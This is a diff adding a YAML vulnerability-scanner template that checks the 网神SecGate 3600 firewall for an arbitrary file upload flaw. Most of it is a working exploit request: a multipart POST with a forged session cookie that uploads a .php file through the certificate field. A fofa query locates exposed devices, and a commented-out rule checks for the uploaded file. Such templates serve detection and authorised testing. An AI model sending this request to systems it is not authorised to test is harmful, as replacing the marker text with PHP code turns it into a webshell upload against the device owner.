@@ -1,0 +1,47 @@
+id: secgate-index-fileupload
+
+info:
+  name: 网神SecGate 3600防火墙index任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    fofa: title="网神SecGate 3600防火墙"
+  tags: secgate,fileupload
+  created: 2024/09/24
+
+set:
+  randstr: randomLowercase(6)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        Cookie: __s_sessionid__=1;
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"certfile\"; filename=\"{{randstr}}.php\"\r\n\
+        Content-Type: text/plain\r\n\
+        \r\n\
+        xxxxxxxxxxxx{{randstr}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"submit_post\"\r\n\
+        \r\n\
+        sec_web_auth_custom_setting_confsave\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"certfile_r\"\r\n\
+        \r\n\
+        file\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 302 && response.body.bcontains(b'windows.locadtion=')
+expression: r0()
+#   r1:
+#     request:
+#       method: GET
+#       path: /attachements/{{randstr}}.php
+#     expression: response.status == 200 && response.body.bcontains(bytes(randstr))
+# expression: r0() && r1()
